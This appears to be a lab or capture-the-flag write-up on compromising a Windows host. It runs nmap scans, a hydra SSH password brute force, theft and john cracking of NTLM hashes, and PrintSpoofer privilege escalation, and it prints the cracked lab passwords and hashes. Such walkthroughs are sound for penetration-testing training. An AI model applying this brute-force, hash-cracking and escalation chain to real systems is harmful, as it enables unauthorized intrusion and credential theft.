*Domain* : target.ine.local
*ip*: 10.5.23.252
*os* : windows
*attacker ip and interface*: 10.10.44.3 `on` eth1
**Wordist:** /usr/share/wordlists/metasploit/unix_passwords.txt
**Tool:** /root/Desktop/PrintSpoofer.exe

---

# Enumeration
## port scan
```shell
nmap --min-rate 3000 -p- -sV target.ine.local
	PORT      STATE SERVICE
	22/tcp    open  ssh
	135/tcp   open  msrpc
	139/tcp   open  netbios-ssn
	445/tcp   open  microsoft-ds
	3389/tcp  open  ms-wbt-server
	49152/tcp open  unknown
	49153/tcp open  unknown
	49154/tcp open  unknown
	49155/tcp open  unknown
	49192/tcp open  unknown
```

## service scan
```shell
nmap -sS -sC -sV -A -T4 -oX scan.xml target.ine.local
PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH for_Windows_9.5 (protocol 2.0)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=WIN-GQ7PTVEC6HL
| Not valid before: 2025-01-08T05:58:14
|_Not valid after:  2025-07-10T05:58:14
| rdp-ntlm-info: 
|   Target_Name: WIN-GQ7PTVEC6HL
|   NetBIOS_Domain_Name: WIN-GQ7PTVEC6HL
|   NetBIOS_Computer_Name: WIN-GQ7PTVEC6HL
|   DNS_Domain_Name: WIN-GQ7PTVEC6HL
|   DNS_Computer_Name: WIN-GQ7PTVEC6HL
|   Product_Version: 6.3.9600
|_  System_Time: 2025-05-15T09:10:50+00:00
|_ssl-date: 2025-05-15T09:10:58+00:00; 0s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC

Network Distance: 3 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-05-15T09:10:52
|_  start_date: 2025-05-15T08:56:12

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.04 ms ap-south-16 (10.10.36.1)
2   ...
3   2.11 ms target.ine.local (10.5.28.147)
```

# exploitation 
## ssh bruteforce
we have user *alice* for ssh
```shell
passwords=/usr/share/wordlists/metasploit/unix_passwords.txt
hydra -l alice -P $passwords -t 35 ssh://target.ine.local
[22][ssh] host: target.ine.local   login: alice   password: princess1
```
-> got user: `alice` pass: `princess1`
# loot
## ssh server 
```shell
user: alice 
service : ssh

# loot
flag1.txt
hashdump.txt
# download or copy using scp
scp alice@target.ine.local:/Users/alice/hashdump.txt hashdumps.txt
```

## bruteforce ntlm hashes
```shell
john --format=nt --wordlist=/usr/share/wordlists/metasploit/unix_passwords.txt hashdumps.txt
# passwords
princess1        (alice)     
orange           (david)
# john show
john --format=nt --show  hashdumps.txt 
alice:princess1:1015:aad3b435b51404eeaad3b435b51404ee:8883a4229c5553c9cca6856a53011e4c:::
david:orange:1016:aad3b435b51404eeaad3b435b51404ee:ca8e025e9893e8ce3d2cbf847fc56814:::
```
-> try creds on difference services
-> user *david* succesed with ssh service
```shell
ssh david@target.ine.local
# succes
# copy printspoofer exploit to target temp dir
scp PrintSpoofer64.exe david@target.ine.local:/temp/

# exploit 
PrintSpoofer64.exe -i -c cmd.exe
```

## privilege escalation
```shell

# windows file permissions commands
C:\Users\Administrator>icacls flag
icacls flag
flag NT AUTHORITY\SYSTEM:(OI)(CI)(DENY)(RX)
     NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
     BUILTIN\Administrators:(I)(OI)(CI)(F)
     WIN-GQ7PTVEC6HL\Administrator:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator>icacls flag /remove:d "NT AUTHORITY\SYSTEM"
icacls flag /remove:d "NT AUTHORITY\SYSTEM"
processed file: flag
Successfully processed 1 files; Failed processing 0 files 

C:\Users\Administrator\flag>more flag4.txt
more flag4.txt
3a0e48fee94f4f6d9dbec62766985a5f
```